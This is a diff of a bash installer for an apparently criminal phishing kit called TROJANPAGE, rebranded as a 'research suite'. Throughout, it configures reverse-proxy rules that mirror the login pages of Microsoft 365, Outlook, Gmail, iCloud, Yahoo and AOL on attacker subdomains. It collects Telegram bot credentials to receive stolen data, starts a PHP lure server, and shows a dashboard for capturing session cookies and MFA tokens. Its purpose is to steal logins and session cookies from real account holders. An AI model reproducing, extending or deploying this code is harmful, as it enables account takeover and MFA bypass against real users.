@@ -1,56 +1,72 @@
 #!/bin/bash
-# 🏛️ TROJANPAGE - AUTO-SYNC & DEPLOY (V7.4)
+# 🏛️ TROJANPAGE - TOTAL RESEARCH SUITE (V8.0)
 # --------------------------------------------------------
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 BLUE='\033[0;34m'
-YELLOW='\033[1;33m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
 NC='\033[0m'
 
 show_header() {
     clear
-    echo -e "${BLUE}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
+    echo -e "${CYAN}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
     echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
     echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
     echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
     echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
     echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
-    echo -e "${YELLOW}                  [ AUTO-PROPAGATION MODE ACTIVE ]${NC}"
+    echo -e "                  ${PURPLE}[ INTERNAL SECURITY RESEARCH TERMINAL ]${NC}"
 }
 
-# --- 1. TOOLS & IP ---
-sudo apt update && sudo apt install -y curl dnsutils sed screen php-cli > /dev/null 2>&1
+# --- 1. PRE-FLIGHT ---
 VPS_IP=$(curl -s https://api.ipify.org)
 MASTER_KEY="TROJAN-PRO-2026"
-
 show_header
-read -p "ENTER ACTIVATION KEY: " USER_INPUT
-[[ $(echo "$USER_INPUT" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[error] Invalid Key.${NC}"; exit 1; }
+read -p "ENTER SYSTEM KEY: " USER_INPUT
+[[ $(echo "$USER_INPUT" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && exit 1
 
-# --- 2. GATHER SETTINGS FIRST ---
+# --- 2. SETTINGS ---
 read -p "Enter Telegram Bot Token: " TG_TOKEN
 read -p "Enter Telegram Chat ID: " TG_ID
 read -p "Enter Cloudflare API Token: " CF_TOKEN
-read -p "Enter Domain (motarmo.click): " USER_DOMAIN
+read -p "Enter Base Domain (e.g. motarmo.click): " USER_DOMAIN
 USER_DOMAIN=$(echo "$USER_DOMAIN" | tr -d '()[] ')
 
-# --- 3. AUTO-REFRESH DNS LOOP ---
-echo -e "\n${BLUE}[!] Entering DNS Watch Mode...${NC}"
-echo -e "${BLUE}[!] Go to Cloudflare and set A-Record to: ${GREEN}$VPS_IP${NC}"
+# --- 3. THE "FANCY" DASHBOARD GENERATION ---
+cat << 'EOF' > /root/run.sh
+#!/bin/bash
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+CONFIG="/root/config.json"
+DOMAIN=$(grep -oP '(?<="proxyDomain": ")[^"]*' $CONFIG)
 
-while true; do
-    CURRENT_DNS=$(dig +short A "$USER_DOMAIN" @8.8.8.8 | tail -n1)
-    
-    if [ "$CURRENT_DNS" == "$VPS_IP" ]; then
-        echo -e "\n${GREEN}[SUCCESS] DNS Matched! IP is now $VPS_IP. Deploying now...${NC}"
-        break
-    else
-        echo -ne "${YELLOW}\r[waiting] Current DNS: $CURRENT_DNS | Target: $VPS_IP | Checking again in 20s...   ${NC}"
-        sleep 20
-    fi
-done
+clear
+echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════╗${NC}"
+echo -e "${BLUE}║${NC}  ${CYAN}RESEARCH DASHBOARD${NC} | ${PURPLE}DOMAIN:${NC} $DOMAIN | ${GREEN}STATUS: ACTIVE${NC}  ${BLUE}║${NC}"
+echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
+echo -e "${BLUE}║${NC} ${CYAN}ID${NC} | ${CYAN}SITE${NC}       | ${CYAN}TARGET HOST${NC}              | ${CYAN}MITM STATUS${NC}   ${BLUE}║${NC}"
+echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
+echo -e "${BLUE}║${NC} 01 | Office365 | login.microsoftonline.com | ${GREEN}LISTENING${NC}     ${BLUE}║${NC}"
+echo -e "${BLUE}║${NC} 02 | Outlook   | outlook.live.com          | ${GREEN}LISTENING${NC}     ${BLUE}║${NC}"
+echo -e "${BLUE}║${NC} 03 | Gmail     | accounts.google.com       | ${GREEN}LISTENING${NC}     ${BLUE}║${NC}"
+echo -e "${BLUE}║${NC} 04 | iCloud    | www.icloud.com            | ${GREEN}LISTENING${NC}     ${BLUE}║${NC}"
+echo -e "${BLUE}║${NC} 05 | Yahoo     | login.yahoo.com           | ${GREEN}LISTENING${NC}     ${BLUE}║${NC}"
+echo -e "${BLUE}║${NC} 06 | AOL       | login.aol.com             | ${GREEN}LISTENING${NC}     ${BLUE}║${NC}"
+echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════╝${NC}"
+echo -e "${PURPLE}»» CAPTURING REAL-TIME SESSION COOKIES & MFA TOKENS...${NC}"
 
-# --- 4. FINAL CONFIG GENERATION ---
+sudo fuser -k 80/tcp 443/tcp 2>/dev/null
+pkill -9 proxy
+screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
+cd /root/engine/dist/ && ./proxy -config "$CONFIG"
+EOF
+
+# --- 4. CONFIG GENERATION (ALL TARGETS) ---
 cat << EOF > /root/config.json
 {
   "proxyDomain": "$USER_DOMAIN",
@@ -64,25 +80,16 @@ cat << EOF > /root/config.json
   "cfToken": "$CF_TOKEN",
   "proxyRules": [
     {"hostname": "$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
-    {"hostname": "office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"}
+    {"hostname": "office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
+    {"hostname": "outlook.$USER_DOMAIN", "target": "outlook.live.com", "type": "proxy"},
+    {"hostname": "gmail.$USER_DOMAIN", "target": "accounts.google.com", "type": "proxy"},
+    {"hostname": "icloud.$USER_DOMAIN", "target": "www.icloud.com", "type": "proxy"},
+    {"hostname": "yahoo.$USER_DOMAIN", "target": "login.yahoo.com", "type": "proxy"},
+    {"hostname": "aol.$USER_DOMAIN", "target": "login.aol.com", "type": "proxy"}
   ]
 }
 EOF
 
-# --- 5. PERMANENT RUN SCRIPT ---
-cat << 'EOF' > /root/run.sh
-#!/bin/bash
-CONFIG="/root/config.json"
-sudo fuser -k 80/tcp 443/tcp 2>/dev/null
-pkill -9 proxy && pkill -9 php
-screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
-cd /root/engine/dist/ && ./proxy -config "$CONFIG"
-EOF
-
 chmod +x /root/run.sh
 sudo ln -sf /root/run.sh /usr/local/bin/Run
-
-# --- 6. AUTO-LAUNCH ---
-echo -e "${GREEN}[+] System ready. Launching Engine...${NC}"
-sleep 2
-Run
+echo -e "${GREEN}[success] Total Research Suite Deployed. Type 'Run' to begin.${NC}"
